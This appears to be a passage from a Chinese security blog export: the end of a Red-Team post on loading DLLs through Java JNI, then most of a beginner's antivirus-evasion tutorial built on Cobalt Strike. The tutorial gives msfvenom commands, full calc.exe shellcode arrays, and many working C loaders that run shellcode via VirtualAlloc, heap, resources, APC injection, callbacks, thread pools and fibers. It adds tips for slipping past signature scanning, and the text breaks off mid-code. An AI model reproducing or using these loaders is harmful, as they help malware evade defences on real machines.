src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/DLL/image-20220825171954049.png\" alt=\"image-20220825171954049\"></p>\n<h1 id=\"武器化思考\"><a href=\"#武器化思考\" class=\"headerlink\" title=\"武器化思考\"></a>武器化思考</h1><p>浅显的思考可利用的地方</p>\n<ul>\n<li>编写多功能DLL，按需执行其中的特定功能</li>\n<li>dll与spring有没有一些利用</li>\n<li>能否实现无文件落地加载dll</li>\n</ul>\n<p>Rvn0xsy项目代码：<a href=\"https://github.com/Rvn0xsy/j2osWin\">Rvn0xsy/j2osWin (github.com)</a></p>\n<h1 id=\"参考\"><a href=\"#参考\" class=\"headerlink\" title=\"参考\"></a>参考</h1><p><a href=\"https://www.cnblogs.com/nice0e3/p/14067160.html\">Java安全之JNI绕过RASP - nice_0e3 - 博客园 (cnblogs.com)</a></p>\n<p><a href=\"https://javasec.org/javase/JNI/\">JNI 安全基础 · 攻击Java Web应用(javasec.org)</a></p>\n<p><a href=\"http://payloads.online/archivers/2022-08-11/1/\">通过动态链接库绕过反病毒软件Hook - Break JVM</a></p>\n<p><a href=\"https://tttang.com/archive/1436/\">Java加载动态链接库 - 跳跳糖 (tttang.com)</a></p>\n","categories":["Red-Team"]},{"title":"免杀入门","url":"/2024/11/07/bypassav/","content":"<h1 id=\"免杀入门\"><a href=\"#免杀入门\" class=\"headerlink\" title=\"免杀入门\"></a>免杀入门</h1><p>环境：cobalt strike 4.4 、自实现profile、全文使用c类型shellcode。</p>\n<p>PS：本人水平低下，针对syscall等底层原理内容实在难于下手，免得乱写一通。</p>\n<a id=\"more\"></a>\n\n<h1 id=\"shellcode的编写\"><a href=\"#shellcode的编写\" class=\"headerlink\" title=\"shellcode的编写\"></a>shellcode的编写</h1><h2 id=\"手动编写-x\"><a href=\"#手动编写-x\" class=\"headerlink\" title=\"手动编写(x)\"></a>手动编写(x)</h2><p>手动编写暂时挖坑</p>\n<h2 id=\"c2生成\"><a href=\"#c2生成\" class=\"headerlink\" title=\"c2生成\"></a>c2生成</h2><p>利用msf生成shellcode</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">msfvenom -p windows&#x2F;x64&#x2F;exec cmd&#x3D;&quot;calc.exe&quot; -f c -o shellcode.c</span><br><span class=\"line\">msfvenom -p windows&#x2F;exec cmd&#x3D;&quot;calc.exe&quot; -f c -o shellcode2.c</span><br><span class=\"line\">msfvenom -p windows&#x2F;x64&#x2F;exec cmd&#x3D;&quot;calc.exe&quot; -f raw -o calc</span><br></pre></td></tr></table></figure>\n\n<p>x64,calc</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">unsigned char buf[] &#x3D;</span><br><span class=\"line\">&quot;\\xfc\\x48\\x83\\xe4\\xf0\\xe8\\xc0\\x00\\x00\\x00\\x41\\x51\\x41\\x50&quot;</span><br><span class=\"line\">&quot;\\x52\\x51\\x56\\x48\\x31\\xd2\\x65\\x48\\x8b\\x52\\x60\\x48\\x8b\\x52&quot;</span><br><span class=\"line\">&quot;\\x18\\x48\\x8b\\x52\\x20\\x48\\x8b\\x72\\x50\\x48\\x0f\\xb7\\x4a\\x4a&quot;</span><br><span class=\"line\">&quot;\\x4d\\x31\\xc9\\x48\\x31\\xc0\\xac\\x3c\\x61\\x7c\\x02\\x2c\\x20\\x41&quot;</span><br><span class=\"line\">&quot;\\xc1\\xc9\\x0d\\x41\\x01\\xc1\\xe2\\xed\\x52\\x41\\x51\\x48\\x8b\\x52&quot;</span><br><span class=\"line\">&quot;\\x20\\x8b\\x42\\x3c\\x48\\x01\\xd0\\x8b\\x80\\x88\\x00\\x00\\x00\\x48&quot;</span><br><span class=\"line\">&quot;\\x85\\xc0\\x74\\x67\\x48\\x01\\xd0\\x50\\x8b\\x48\\x18\\x44\\x8b\\x40&quot;</span><br><span class=\"line\">&quot;\\x20\\x49\\x01\\xd0\\xe3\\x56\\x48\\xff\\xc9\\x41\\x8b\\x34\\x88\\x48&quot;</span><br><span class=\"line\">&quot;\\x01\\xd6\\x4d\\x31\\xc9\\x48\\x31\\xc0\\xac\\x41\\xc1\\xc9\\x0d\\x41&quot;</span><br><span class=\"line\">&quot;\\x01\\xc1\\x38\\xe0\\x75\\xf1\\x4c\\x03\\x4c\\x24\\x08\\x45\\x39\\xd1&quot;</span><br><span class=\"line\">&quot;\\x75\\xd8\\x58\\x44\\x8b\\x40\\x24\\x49\\x01\\xd0\\x66\\x41\\x8b\\x0c&quot;</span><br><span class=\"line\">&quot;\\x48\\x44\\x8b\\x40\\x1c\\x49\\x01\\xd0\\x41\\x8b\\x04\\x88\\x48\\x01&quot;</span><br><span class=\"line\">&quot;\\xd0\\x41\\x58\\x41\\x58\\x5e\\x59\\x5a\\x41\\x58\\x41\\x59\\x41\\x5a&quot;</span><br><span class=\"line\">&quot;\\x48\\x83\\xec\\x20\\x41\\x52\\xff\\xe0\\x58\\x41\\x59\\x5a\\x48\\x8b&quot;</span><br><span class=\"line\">&quot;\\x12\\xe9\\x57\\xff\\xff\\xff\\x5d\\x48\\xba\\x01\\x00\\x00\\x00\\x00&quot;</span><br><span class=\"line\">&quot;\\x00\\x00\\x00\\x48\\x8d\\x8d\\x01\\x01\\x00\\x00\\x41\\xba\\x31\\x8b&quot;</span><br><span class=\"line\">&quot;\\x6f\\x87\\xff\\xd5\\xbb\\xf0\\xb5\\xa2\\x56\\x41\\xba\\xa6\\x95\\xbd&quot;</span><br><span class=\"line\">&quot;\\x9d\\xff\\xd5\\x48\\x83\\xc4\\x28\\x3c\\x06\\x7c\\x0a\\x80\\xfb\\xe0&quot;</span><br><span class=\"line\">&quot;\\x75\\x05\\xbb\\x47\\x13\\x72\\x6f\\x6a\\x00\\x59\\x41\\x89\\xda\\xff&quot;</span><br><span class=\"line\">&quot;\\xd5\\x63\\x61\\x6c\\x63\\x2e\\x65\\x78\\x65\\x00&quot;;</span><br></pre></td></tr></table></figure>\n\n<p>x86,calc</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">unsigned char buf[] &#x3D;</span><br><span class=\"line\">&quot;\\xfc\\xe8\\x82\\x00\\x00\\x00\\x60\\x89\\xe5\\x31\\xc0\\x64\\x8b\\x50&quot;</span><br><span class=\"line\">&quot;\\x30\\x8b\\x52\\x0c\\x8b\\x52\\x14\\x8b\\x72\\x28\\x0f\\xb7\\x4a\\x26&quot;</span><br><span class=\"line\">&quot;\\x31\\xff\\xac\\x3c\\x61\\x7c\\x02\\x2c\\x20\\xc1\\xcf\\x0d\\x01\\xc7&quot;</span><br><span class=\"line\">&quot;\\xe2\\xf2\\x52\\x57\\x8b\\x52\\x10\\x8b\\x4a\\x3c\\x8b\\x4c\\x11\\x78&quot;</span><br><span class=\"line\">&quot;\\xe3\\x48\\x01\\xd1\\x51\\x8b\\x59\\x20\\x01\\xd3\\x8b\\x49\\x18\\xe3&quot;</span><br><span class=\"line\">&quot;\\x3a\\x49\\x8b\\x34\\x8b\\x01\\xd6\\x31\\xff\\xac\\xc1\\xcf\\x0d\\x01&quot;</span><br><span class=\"line\">&quot;\\xc7\\x38\\xe0\\x75\\xf6\\x03\\x7d\\xf8\\x3b\\x7d\\x24\\x75\\xe4\\x58&quot;</span><br><span class=\"line\">&quot;\\x8b\\x58\\x24\\x01\\xd3\\x66\\x8b\\x0c\\x4b\\x8b\\x58\\x1c\\x01\\xd3&quot;</span><br><span class=\"line\">&quot;\\x8b\\x04\\x8b\\x01\\xd0\\x89\\x44\\x24\\x24\\x5b\\x5b\\x61\\x59\\x5a&quot;</span><br><span class=\"line\">&quot;\\x51\\xff\\xe0\\x5f\\x5f\\x5a\\x8b\\x12\\xeb\\x8d\\x5d\\x6a\\x01\\x8d&quot;</span><br><span class=\"line\">&quot;\\x85\\xb2\\x00\\x00\\x00\\x50\\x68\\x31\\x8b\\x6f\\x87\\xff\\xd5\\xbb&quot;</span><br><span class=\"line\">&quot;\\xf0\\xb5\\xa2\\x56\\x68\\xa6\\x95\\xbd\\x9d\\xff\\xd5\\x3c\\x06\\x7c&quot;</span><br><span class=\"line\">&quot;\\x0a\\x80\\xfb\\xe0\\x75\\x05\\xbb\\x47\\x13\\x72\\x6f\\x6a\\x00\\x53&quot;</span><br><span class=\"line\">&quot;\\xff\\xd5\\x63\\x61\\x6c\\x63\\x2e\\x65\\x78\\x65\\x00&quot;;</span><br></pre></td></tr></table></figure>\n\n\n\n<h1 id=\"shellcode的加载\"><a href=\"#shellcode的加载\" class=\"headerlink\" title=\"shellcode的加载\"></a>shellcode的加载</h1><p><a href=\"https://www.cnblogs.com/henry666/p/17429771.html\">总结加载Shellcode的各种方式 - 亨利其实很坏</a></p>\n<h2 id=\"内联汇编\"><a href=\"#内联汇编\" class=\"headerlink\" title=\"内联汇编\"></a>内联汇编</h2><p>直接嵌入汇编语言调用shellcode，vs中默认不支持x64，仅支持x32位的shellcode</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">#pragma comment(linker, &quot;&#x2F;section:.data,RWE&quot;)   &#x2F;&#x2F;data段可读写  </span><br><span class=\"line\">&#x2F;&#x2F;#pragma comment(linker,&quot;&#x2F;subsystem:\\&quot;windows\\&quot; &#x2F;entry:\\&quot;mainCRTStartup\\&quot;&quot;)   &#x2F;&#x2F;不显示窗口 </span><br><span class=\"line\"></span><br><span class=\"line\">unsigned char buf[] &#x3D;</span><br><span class=\"line\">&quot;\\xfc\\xe8\\x82\\x00\\x00\\x00\\x60\\x89\\xe5\\x31\\xc0\\x64\\x8b\\x50&quot;</span><br><span class=\"line\">&quot;\\x30\\x8b\\x52\\x0c\\x8b\\x52\\x14\\x8b\\x72\\x28\\x0f\\xb7\\x4a\\x26&quot;</span><br><span class=\"line\">&quot;\\x31\\xff\\xac\\x3c\\x61\\x7c\\x02\\x2c\\x20\\xc1\\xcf\\x0d\\x01\\xc7&quot;</span><br><span class=\"line\">&quot;\\xe2\\xf2\\x52\\x57\\x8b\\x52\\x10\\x8b\\x4a\\x3c\\x8b\\x4c\\x11\\x78&quot;</span><br><span class=\"line\">&quot;\\xe3\\x48\\x01\\xd1\\x51\\x8b\\x59\\x20\\x01\\xd3\\x8b\\x49\\x18\\xe3&quot;</span><br><span class=\"line\">&quot;\\x3a\\x49\\x8b\\x34\\x8b\\x01\\xd6\\x31\\xff\\xac\\xc1\\xcf\\x0d\\x01&quot;</span><br><span class=\"line\">&quot;\\xc7\\x38\\xe0\\x75\\xf6\\x03\\x7d\\xf8\\x3b\\x7d\\x24\\x75\\xe4\\x58&quot;</span><br><span class=\"line\">&quot;\\x8b\\x58\\x24\\x01\\xd3\\x66\\x8b\\x0c\\x4b\\x8b\\x58\\x1c\\x01\\xd3&quot;</span><br><span class=\"line\">&quot;\\x8b\\x04\\x8b\\x01\\xd0\\x89\\x44\\x24\\x24\\x5b\\x5b\\x61\\x59\\x5a&quot;</span><br><span class=\"line\">&quot;\\x51\\xff\\xe0\\x5f\\x5f\\x5a\\x8b\\x12\\xeb\\x8d\\x5d\\x6a\\x01\\x8d&quot;</span><br><span class=\"line\">&quot;\\x85\\xb2\\x00\\x00\\x00\\x50\\x68\\x31\\x8b\\x6f\\x87\\xff\\xd5\\xbb&quot;</span><br><span class=\"line\">&quot;\\xf0\\xb5\\xa2\\x56\\x68\\xa6\\x95\\xbd\\x9d\\xff\\xd5\\x3c\\x06\\x7c&quot;</span><br><span class=\"line\">&quot;\\x0a\\x80\\xfb\\xe0\\x75\\x05\\xbb\\x47\\x13\\x72\\x6f\\x6a\\x00\\x53&quot;</span><br><span class=\"line\">&quot;\\xff\\xd5\\x63\\x61\\x6c\\x63\\x2e\\x65\\x78\\x65\\x00&quot;;</span><br><span class=\"line\"></span><br><span class=\"line\">void main()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t__asm &#123;</span><br><span class=\"line\">\t\tlea eax,buf</span><br><span class=\"line\">\t\tcall eax</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>mov eax, offset ShellCode 可以用 lea eax, ShellCode 代替</p>\n<p>jmp 也可以用 call 代替</p>\n<p><strong>添加花指令：</strong></p>\n<p><a href=\"https://blog.csdn.net/m0_46296905/article/details/117336574\">花指令简析_花指令生成</a></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">#include &lt;windows.h&gt;</span><br><span class=\"line\">#include &lt;stdio.h&gt;</span><br><span class=\"line\">#pragma comment(linker, &quot;&#x2F;section:.data,RWE&quot;)</span><br><span class=\"line\">unsigned char shellcode[] &#x3D;&quot;&quot;;</span><br><span class=\"line\">void main()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t__asm</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        mov eax, offset shellcode</span><br><span class=\"line\">        _emit 0xFF  </span><br><span class=\"line\">        _emit 0xE0</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n\n\n<h2 id=\"函数指针执行\"><a href=\"#函数指针执行\" class=\"headerlink\" title=\"函数指针执行\"></a>函数指针执行</h2><p><strong>将buf的首地址强转为函数指针并调用,而buf的首地址内容为shellcode</strong></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">#pragma comment(linker, &quot;&#x2F;section:.data,RWE&quot;)  &#x2F;&#x2F;data段可读写执行</span><br><span class=\"line\">#pragma comment(linker,&quot;&#x2F;subsystem:\\&quot;windows\\&quot; &#x2F;entry:\\&quot;mainCRTStartup\\&quot;&quot;) &#x2F;&#x2F;不显示windows窗口  </span><br><span class=\"line\"></span><br><span class=\"line\">unsigned char buf[] &#x3D; &quot;shellcode&quot;;</span><br><span class=\"line\"></span><br><span class=\"line\">void main()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t( (void(*)(void)) &amp; buf)();</span><br><span class=\"line\">\t&#x2F;&#x2F; ( (void(WINAPI*)(void)) &amp; buf)();</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>理解 <code>(*(void (*)()) lpBaseAddress)()</code></p>\n<p>就是把从指定地址开始的命令当作函数进行调用执行。</p>\n<ol>\n<li><code>void (*)()</code> 是一个无参数、无返回类型的函数指针。</li>\n<li><code>(void (*)())lpBaseAddress</code> 是将lpBaseAddress强转为函数指针类型。</li>\n<li><code>(*(void (*)()) lpBaseAddress)()</code> 就是通过函数指针(相当于这个格式<code>(*函数指针)()</code>)进行函数调用。</li>\n</ol>\n<p>没有调用WinApi，可对shellcode进行加密编码</p>\n<h2 id=\"申请动态内存加载\"><a href=\"#申请动态内存加载\" class=\"headerlink\" title=\"申请动态内存加载\"></a>申请动态内存加载</h2><p>通过调用winapi：VirtualAlloc 主要用于在进程的虚拟地址空间中分配一块内存，这块内存可以被用于多种目的，包括作为堆、栈、映射文件等。将shellcode复制到申请的地址，通过 函数指针执行 或 创建线程执行</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">申请内存页时，可以在Shellcode读入时，申请一个普通的可读写的内存页，然后再通过VirtualProtect改变它的属性 -&gt; 可执行。这样也能规避掉一些特征查杀。</span><br></pre></td></tr></table></figure>\n\n<p><strong>函数指针执行：</strong></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">#include &lt;Windows.h&gt;</span><br><span class=\"line\">#include &lt;stdio.h&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">#pragma comment(linker,&quot;&#x2F;subsystem:\\&quot;Windows\\&quot; &#x2F;entry:\\&quot;mainCRTStartup\\&quot;&quot;) &#x2F;&#x2F;windows控制台程序不出黑窗口</span><br><span class=\"line\">unsigned char buf[] &#x3D; &quot;shellcode is here&quot;;</span><br><span class=\"line\">main()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tchar *Memory; </span><br><span class=\"line\">\tMemory&#x3D;VirtualAlloc(NULL, sizeof(buf), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);</span><br><span class=\"line\">\tmemcpy(Memory, buf, sizeof(buf));</span><br><span class=\"line\">\t((void(*)())Memory)();</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p><strong>创建线程执行：</strong></p>\n<p>在创建线程时需要进行等待子线程完成，sleep一会或者WaitForSingleObject等待信号</p>\n<blockquote>\n<p>main退出时自动调用ExitProcess()，操作系统终止所有运行的线程。WaitForSingleObject保证main在子线程运行期间不返回。</p>\n</blockquote>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">#include &lt;windows.h&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">#pragma comment(linker,&quot;&#x2F;subsystem:\\&quot;windows\\&quot; &#x2F;entry:\\&quot;mainCRTStartup\\&quot;&quot;)  </span><br><span class=\"line\">unsigned char buf[] &#x3D;&quot;shellcode is here&quot;;</span><br><span class=\"line\"></span><br><span class=\"line\">void main()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    LPVOID pMemory &#x3D; VirtualAlloc(NULL, sizeof(buf), MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span><br><span class=\"line\">    RtlMoveMemory(pMemory, buf, sizeof(buf));</span><br><span class=\"line\">    HANDLE hThread &#x3D; CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)pMemory, NULL, 0, NULL);</span><br><span class=\"line\">    WaitForSingleObject(hThread, INFINITE);</span><br><span class=\"line\">    VirtualFree(pMemory, 0, MEM_RELEASE);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n\n\n<h2 id=\"堆加载\"><a href=\"#堆加载\" class=\"headerlink\" title=\"堆加载\"></a>堆加载</h2><p>类似于动态申请内存，只不过申请的是堆空间</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">#include &lt;windows.h&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">#pragma comment(linker,&quot;&#x2F;subsystem:\\&quot;windows\\&quot; &#x2F;entry:\\&quot;mainCRTStartup\\&quot;&quot;)  </span><br><span class=\"line\">unsigned char buf[] &#x3D;&quot;shellcode is here&quot;;</span><br><span class=\"line\"></span><br><span class=\"line\">int main() </span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tHANDLE heap &#x3D; HeapCreate(HEAP_CREATE_ENABLE_EXECUTE, sizeof(buf), 0);</span><br><span class=\"line\">\tLPVOID buffer &#x3D; HeapAlloc(heap, HEAP_ZERO_MEMORY,sizeof(buf));</span><br><span class=\"line\">\tRtlMoveMemory(buffer,buf,sizeof(buf));</span><br><span class=\"line\">\tHANDLE hThread &#x3D; CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)buffer, NULL, 0, NULL);</span><br><span class=\"line\">\tWaitForSingleObject(hThread, INFINITE);</span><br><span class=\"line\">\tHeapFree(heap, 0, buffer);</span><br><span class=\"line\"></span><br><span class=\"line\">\treturn 0;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n\n\n<h2 id=\"资源节加载\"><a href=\"#资源节加载\" class=\"headerlink\" title=\"资源节加载\"></a>资源节加载</h2><p>资源文件通常存放在 <code>.rsrc</code> 节（Resource Section）中。<code>.rsrc</code> 节是 PE（Portable Executable）文件格式中的一个节（section），用于存储程序的资源信息，如图标、对话框、字符串、位图等。每个资源项都有一个唯一的标识符（ID），程序可以通过这个标识符来获取特定的资源。</p>\n<p>vs中 <strong>添加资源，导入bin文件，自定义资源类型</strong></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">#include &lt;Windows.h&gt;</span><br><span class=\"line\">#include &quot;resource.h&quot;</span><br><span class=\"line\"></span><br><span class=\"line\">&#x2F;&#x2F;通过资源加载ShellCode</span><br><span class=\"line\">void ResourceLoader() &#123;</span><br><span class=\"line\">\t&#x2F;&#x2F;获取资源</span><br><span class=\"line\">    HRSRC Res &#x3D; FindResource(NULL, MAKEINTRESOURCE(IDR_SHELLCODE1), L&quot;shellcode&quot;);</span><br><span class=\"line\">    &#x2F;&#x2F;用于获取资源的大小</span><br><span class=\"line\">    DWORD ResSize &#x3D; SizeofResource(NULL, Res);</span><br><span class=\"line\">    &#x2F;&#x2F;LoadResource函数会将指定资源句柄所指向的资源数据加载到内存中，并返回一个指向该资源数据的句柄</span><br><span class=\"line\">    HGLOBAL Load &#x3D; LoadResource(NULL, Res);</span><br><span class=\"line\">    &#x2F;&#x2F;申请内存</span><br><span class=\"line\">    void* buffer &#x3D; VirtualAlloc(NULL, ResSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span><br><span class=\"line\">    memcpy(buffer, Load, ResSize);</span><br><span class=\"line\">    &#x2F;&#x2F;执行shellcode</span><br><span class=\"line\">    ((void(*)(void)) buffer)();</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">int main() &#123;</span><br><span class=\"line\">    ResourceLoader();</span><br><span class=\"line\">    return 0;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n\n\n<h2 id=\"APC注入\"><a href=\"#APC注入\" class=\"headerlink\" title=\"APC注入\"></a>APC注入</h2><p>异步过程调用（APC）队列是一个与线程关联的队列，用于存储要在该线程上下文中异步执行的函数。操作系统内核会跟踪每个线程的 APC 队列，并在适当的时机触发队列中挂起的函数。APC 队列通常用于实现线程间的异步通信、定时器回调以及异步 I/O 操作。</p>\n<p>触发流程：</p>\n<ul>\n<li>使用 <code>VirtualProtect</code> 函数修改 <code>shellcode</code> 所在内存区域的保护属性，将其设置为可执行、可读、可写</li>\n<li>获取 <code>NtTestAlert</code> 函数的地址。(这是一个内部函数，无法直接通过函数名调用，<code>NtTestAlert</code> 函数用于检查当前线程的 APC 队列，如果队列中有挂起的用户模式 APC 请求，<code>NtTestAlert</code> 将触发它们的执行)</li>\n<li>使用 <code>QueueUserAPC</code> 函数向当前线程的 APC 队列添加一个执行 Shellcode 的任务</li>\n<li>调用 <code>NtTestAlert</code> 函数，触发 APC 队列中的任务执行，实现 Shellcode 的执行</li>\n</ul>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">#include &lt;Windows.h&gt;</span><br><span class=\"line\">#include &lt;stdio.h&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">typedef DWORD(WINAPI* pNtTestAlert)();</span><br><span class=\"line\"></span><br><span class=\"line\">unsigned char buf[] &#x3D; &quot;shellcode is here&quot;;</span><br><span class=\"line\"></span><br><span class=\"line\">int main() </span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    &#x2F;&#x2F; 修改 shellcode 所在内存区域的保护属性，允许执行</span><br><span class=\"line\">    DWORD oldProtect;</span><br><span class=\"line\">    VirtualProtect((LPVOID)buf, sizeof(buf), PAGE_EXECUTE_READWRITE, &amp;oldProtect);</span><br><span class=\"line\"></span><br><span class=\"line\">    &#x2F;&#x2F;获取NtTestAlert函数地址, 因为它是一个内部函数.无法直接通过函数名调用</span><br><span class=\"line\">    pNtTestAlert NtTestAlert &#x3D; (pNtTestAlert)(GetProcAddress(GetModuleHandleA(&quot;ntdll&quot;), &quot;NtTestAlert&quot;));</span><br><span class=\"line\"></span><br><span class=\"line\">    &#x2F;&#x2F; 将buf强转为APC 函数,向当前线程的异步过程调用(APC)队列添加一个执行shellcode的任务</span><br><span class=\"line\">    QueueUserAPC((PAPCFUNC)buf, GetCurrentThread(), NULL);</span><br><span class=\"line\"></span><br><span class=\"line\">    &#x2F;&#x2F;调用NtTestAlert，触发 APC 队列中的任务执行（即执行 shellcode）</span><br><span class=\"line\">    NtTestAlert();</span><br><span class=\"line\"></span><br><span class=\"line\">\treturn 0;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n\n\n<h2 id=\"基于回调函数\"><a href=\"#基于回调函数\" class=\"headerlink\" title=\"基于回调函数\"></a>基于回调函数</h2><p>通过 <strong>各种回调函数</strong></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">EnumTimeFormatsA</span><br><span class=\"line\">EnumWindows</span><br><span class=\"line\">EnumDesktopWindows</span><br><span class=\"line\">EnumDateFormatsA</span><br><span class=\"line\">EnumChildWindows</span><br><span class=\"line\">EnumThreadWindows</span><br><span class=\"line\">EnumSystemLocalesA</span><br><span class=\"line\">EnumSystemGeoID</span><br><span class=\"line\">EnumSystemLanguageGroupsA</span><br><span class=\"line\">EnumUILanguagesA</span><br><span class=\"line\">EnumSystemCodePagesA</span><br><span class=\"line\">EnumDesktopsW</span><br><span class=\"line\">EnumSystemCodePagesW</span><br><span class=\"line\">...</span><br></pre></td></tr></table></figure>\n\n<p><strong>EnumFontsW</strong></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">#include &lt;Windows.h&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">unsigned char buf[] &#x3D; &quot;shellcode is here&quot;;</span><br><span class=\"line\"></span><br><span class=\"line\">int main() </span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t&#x2F;&#x2F; 开辟空间</span><br><span class=\"line\">\tvoid *shellcode &#x3D; VirtualAlloc(NULL,sizeof(buf),MEM_COMMIT,PAGE_EXECUTE_READWRITE);</span><br><span class=\"line\">\t&#x2F;&#x2F; copy shellcode</span><br><span class=\"line\">\tRtlMoveMemory(shellcode, buf, sizeof(buf));</span><br><span class=\"line\">\t&#x2F;&#x2F; 触发回调函数</span><br><span class=\"line\">\tEnumFontsW(GetDC(NULL), NULL, (FONTENUMPROCW)shellcode, NULL);</span><br><span class=\"line\">\tEnumUILanguages((UILANGUAGE_ENUMPROCW)shellcode, 0, NULL);</span><br><span class=\"line\"></span><br><span class=\"line\">\treturn 0;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n\n\n<h2 id=\"线程池等待\"><a href=\"#线程池等待\" class=\"headerlink\" title=\"线程池等待\"></a>线程池等待</h2><p>类似于回调函数，只不过是在线程池的应用中的几个函数</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">#include &lt;Windows.h&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">unsigned char buf[] &#x3D; &quot;shellcode is here&quot;;</span><br><span class=\"line\"></span><br><span class=\"line\">int main()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    void* shellcode &#x3D; VirtualAlloc(NULL, sizeof(buf), MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span><br><span class=\"line\">    RtlMoveMemory(shellcode, buf, sizeof(buf));</span><br><span class=\"line\">    &#x2F;*</span><br><span class=\"line\">    * CreateEvent是Windows API，用于创建一个事件对象</span><br><span class=\"line\">    * 参数1：安全属性，NULL表示默认</span><br><span class=\"line\">    * 参数2：是否手动复位</span><br><span class=\"line\">    * 参数3：TRUE表示事件对象的初始状态为有信号状态，否则为无信号状态</span><br><span class=\"line\">    * 参数4：事件名称，NULL表示不使用名称</span><br><span class=\"line\">    *&#x2F;</span><br><span class=\"line\">    HANDLE event &#x3D; CreateEvent(NULL, FALSE, TRUE, NULL);</span><br><span class=\"line\">    &#x2F;*</span><br><span class=\"line\">    * CreateThreadpoolWait是Windows API，用于创建一个线程池等待对象</span><br><span class=\"line\">    * 参数1：回调函数指针</span><br><span class=\"line\">    * 参数2：回调函数参数</span><br><span class=\"line\">    * 参数3：线程池回调环境</span><br><span class=\"line\">    *&#x2F;</span><br><span class=\"line\">    PTP_WAIT threadPoolWait &#x3D; CreateThreadpoolWait((PTP_WAIT_CALLBACK)(LPVOID)shellcode, NULL, NULL);</span><br><span class=\"line\">    &#x2F;*</span><br><span class=\"line\">    * SetThreadpoolWait是Windows API，用于向线程池中添加等待对象</span><br><span class=\"line\">    * 参数1：线程池等待对象</span><br><span class=\"line\">    * 参数2：要等待的内核对象句柄</span><br><span class=\"line\">    * 参数3：等待超时时间，NULL表示无限等待</span><br><span class=\"line\">    *&#x2F;</span><br><span class=\"line\">    SetThreadpoolWait(threadPoolWait, event, NULL);</span><br><span class=\"line\">    WaitForSingleObject(event, INFINITE); &#x2F;&#x2F; 等待事件对象执行完毕(状态变为无信号)，事件对象执行会执行回调函数buf</span><br><span class=\"line\"></span><br><span class=\"line\">\treturn 0;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n\n\n<h2 id=\"纤程加载\"><a href=\"#纤程加载\" class=\"headerlink\" title=\"纤程加载\"></a>纤程加载</h2><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">#include &lt;Windows.h&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">unsigned char buf[] &#x3D; &quot;shellcode is here&quot;;</span><br><span class=\"line\"></span><br><span class=\"line\">int main() &#123;</span><br><span class=\"line\">    DWORD oldProtect;</span><br><span class=\"line\">    VirtualProtect((LPVOID)buf, sizeof(buf), PAGE_EXECUTE_READWRITE, &amp;oldProtect);</span><br><span class=\"line\"></span><br><span class=\"line\">    &#x2F;&#x2F; 将当前线程转换为纤程（轻量级线程）</span><br><span class=\"line\">    ConvertThreadToFiber(NULL);</span><br><span class=\"line\"></span><br><span class=\"line\">    &#x2F;&#x2F; 创建一个纤程对象，关联到shellcode作为纤程入口点，使用默认栈大小和无标志位</span><br><span class=\"line\">    void* shellcodeFiber &#x3D; CreateFiber(0, (LPFIBER_START_ROUTINE)(LPVOID)buf, NULL);</span><br><span class=\"line\"></span><br><span class=\"line\">    &#x2F;&#x2F; 切换到新创建的纤程，开始执行shellcode</span><br><span class=\"line\">    SwitchToFiber(shellcodeFiber);</span><br><span class=\"line\"></span><br><span class=\"line\">    